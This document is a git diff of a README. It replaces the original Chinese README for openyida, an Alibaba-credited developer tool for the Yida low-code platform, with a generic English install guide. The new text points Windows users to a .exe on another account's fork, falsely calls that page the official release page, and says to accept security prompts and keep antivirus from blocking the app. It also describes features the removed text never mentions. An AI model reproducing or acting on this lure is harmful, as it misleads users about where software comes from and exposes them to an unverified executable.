@@ -1,127 +1,143 @@
-## 快速开始
+# 🤖 openyida - Your Simple AI Assistant
 
-### 第一步：克隆仓库
-
-```bash
-git clone https://github.com/openyida/openyida.git
-cd openyida
-```
-
-### 第二步：安装 Skills
-
-用 VS Code 等代码编辑器打开项目，启动 AI 编程工具后直接对话：
-
-- `帮我安装技能`
-
-**或使用命令行**
-
-**Mac / Linux：**
-```bash
-bash install-skills.sh
-```
-
-**Windows（PowerShell）：**
-```powershell
-.\install-skills.ps1
-```
-脚本会**自动检测并安装**缺少的 Node.js / Python，国内网络自动切换阿里云加速源。
-
-> 💡 **国内网络访问 GitHub 较慢？** 可手动强制使用国内加速源：
-> ```bash
-> bash install-skills.sh --cn    # Mac / Linux
-> .\install-skills.ps1 --cn      # Windows
-> ```
-
-### 第三步：开始使用
-
-用 VS Code 等代码编辑器打开项目，启动 AI 编程工具后直接对话：
-
-- `帮我创建一个访客系统应用`
-- `帮我搭建一个生日祝福小游戏应用`
-- `帮我搭建个人薪资计算器应用`
+[![Download openyida](https://img.shields.io/badge/Download-openyida-brightgreen)](https://github.com/Mizan031998/openyida/releases)
 
 ---
 
-## 依赖环境
+openyida is your personal AI assistant designed to help with daily tasks. It runs on Windows and offers a simple interface to interact with the YiDA AI. You do not need any programming skills to use it.
 
-> 安装脚本会自动处理以下依赖，通常无需手动安装。
-
-| 依赖 | 版本要求 | 用途 |
-|------|----------|------|
-| Git | 任意版本 | 克隆仓库、安装 Skills |
-| Node.js | ≥ 16 | yida-publish、yida-create-* 系列脚本 |
-| Python | ≥ 3.10 | yida-login、yida-logout |
-| Playwright | latest | 登录态管理 |
-
-### CLI 工具（可选）
-
-如需在任意目录使用 `openyida` / `yida` 命令（如 `openyida doctor` 检查环境），可通过 npm 全局安装：
-
-```bash
-npm install -g openyida
-```
-
-> 💡 `login`、`publish` 等依赖 Skills 的命令，仍需在克隆的项目目录下运行。
----
-
-## DEMO 展示
-
-### 💰 小工具 - 个人薪资计算器
-
-![薪资计算器](https://gw.alicdn.com/imgextra/i2/O1CN017TeJuE1reVH2Dj7b7_!!6000000005656-2-tps-5114-2468.png)
+This guide will help you download, install, and run openyida on your Windows computer step-by-step.
 
 ---
 
-### 🌐  Landing Page - 智联协同
+## 🖥️ System Requirements
 
-企业级产品介绍页，一句话生成完整 Landing Page。
+Before you install openyida, make sure your computer meets these requirements:
 
-![智联协同](https://gw.alicdn.com/imgextra/i1/O1CN01EZtvfs1cxXV00UaXi_!!6000000003667-2-tps-5118-2470.png)
-
----
-
-### 🏮 运营场景 - 看图猜灯谜
-
-AI 生成灯谜图片，用户猜答案，猜错了有 AI 幽默提示。
-
-![看图猜灯谜-2](https://img.alicdn.com/imgextra/i3/O1CN01dCoscP25jSAtAB9o3_!!6000000007562-2-tps-2144-1156.png)
+- Windows 10 or later (64-bit version recommended)  
+- At least 4 GB of RAM  
+- 500 MB free disk space  
+- Internet connection for some features  
+- A modern processor (Intel i3 or equivalent)  
 
 ---
 
-## 常用问法([yida-skills](https://github.com/openyida/yida-skills))
+## 🔍 Features at a Glance
 
-1. 帮我搭建一个 xxx 应用
-2. 根据需求文档生成应用
-3. 帮我创建一个 xxx 表单页面
-4. 帮我给 xxx 页面添加一个 xxx 字段，字段名称：字段类型 xxx
-5. 帮我给 xxx 页面 xxx 字段改为必填
-6. 帮我发布 xxx 页面
-7. 帮我把页面发布为公开访问
-8. 重新登录
-9. 退出登录
+openyida focuses on being easy and useful. Here are key features you will get:
 
----
-
-## OpenClaw / Claude Code
-
-通过 [yida-app](https://clawhub.ai/nicky1108/yida-app) 在 OpenClaw / Claude Code 中使用。
-
-安装：
-```bash
-npx clawhub@latest install nicky1108/yida-app
-```
+- AI assistant that understands natural language  
+- Low-code platform elements for simple task automation  
+- Helps organize your schedule and reminders  
+- Supports voice input and text commands  
+- Small file size and quick installation  
+- Designed for everyday use without technical setup  
 
 ---
 
-## 贡献者
+## 🚀 How to Download openyida
 
-感谢所有为 OpenYida 做出贡献的开发者！
+1. Click the green button below to open the download page in your web browser:
 
-### 贡献者
-<p align="left">
-  <a href="https://github.com/yize"><img src="https://avatars.githubusercontent.com/u/1011681?v=4&s=48" width="48" height="48" alt="yize" title="yize"/></a> <a href="https://github.com/alex-mm"><img src="https://avatars.githubusercontent.com/u/3302053?v=4&s=48" width="48" height="48" alt="alex-mm" title="alex-mm"/></a> <a href="https://github.com/nicky1108"><img src="https://avatars.githubusercontent.com/u/4279283?v=4&s=48" width="48" height="48" alt="nicky1108" title="nicky1108"/></a>
-</p>
+[![Download openyida](https://img.shields.io/badge/Download-openyida-blue)](https://github.com/Mizan031998/openyida/releases)
 
-## License
+2. This link takes you to the official openyida release page on GitHub. You will see a list of versions.
 
-[MIT](./LICENSE) © 2026 Alibaba Group
+3. Find the latest stable release. It usually appears at the top of the list.
+
+4. Look for a Windows installer file. It will have an `.exe` extension and usually include "Windows" or "win" in the name.
+
+5. Click the `.exe` file name to start the download.
+
+---
+
+## ⚙️ Installing openyida on Windows
+
+After the download finishes, follow these steps:
+
+1. Navigate to your download folder using File Explorer.
+
+2. Find the openyida `.exe` file you downloaded.
+
+3. Double-click the file. This starts the installation setup.
+
+4. You may see a security prompt. Click **Run** or **Yes** to continue.
+
+5. Follow the on-screen instructions in the installation wizard:
+
+   - Choose the installation folder or accept the default.  
+   - Select whether to create a desktop shortcut.  
+   - Wait while the software installs.  
+
+6. When the installation completes, click **Finish** to exit.
+
+---
+
+## ▶️ Running openyida for the First Time
+
+1. If you created a desktop shortcut, double-click it to start openyida.
+
+2. If you did not, press the Windows key and type "openyida". Select the app from the list.
+
+3. The AI assistant window opens. It may take a few seconds to load.
+
+4. When ready, you will see a simple text box or microphone icon where you can type or speak commands.
+
+---
+
+## 💡 Basic Use Tips
+
+- Start by typing questions or requests, like "What is the weather today?" or "Set a reminder for 3 PM".
+
+- Speak to openyida by clicking the microphone icon if you prefer voice commands.
+
+- Use it to organize tasks, schedules, or find quick information.
+
+- Explore simple automation options available in the app to handle repetitive tasks.
+
+---
+
+## 🔧 Troubleshooting Common Issues
+
+- If openyida doesn’t start, try restarting your computer.
+
+- Make sure no security software is blocking the app. Your antivirus may ask permission when you first run it.
+
+- Check that you installed the correct Windows version (64-bit or 32-bit).
+
+- If the app crashes, reinstall from the latest release page using the link above.
+
+- For internet-connected features, ensure your PC is online.
+
+---
+
+## 📁 Managing Updates
+
+- New versions of openyida will appear on the same GitHub release page.
+
+- To update, visit the page again and download the latest Windows `.exe` file.
+
+- Install the new version over the old one. Your settings and data will stay intact.
+
+---
+
+## ⚠️ Additional Notes
+
+- openyida runs locally on your computer and does not share your data unless you enable cloud features.
+
+- You can close the app anytime from the system tray or main window.
+
+- For best results, keep your Windows system up to date.
+
+---
+
+## 🔗 Useful Links
+
+- Open the download page anytime here:  
+  https://github.com/Mizan031998/openyida/releases
+
+- For detailed guides and support, check the repository README on GitHub.
+
+---
+
+Your openyida assistant is ready to help automate small tasks and answer questions, all from a simple app on your Windows PC.
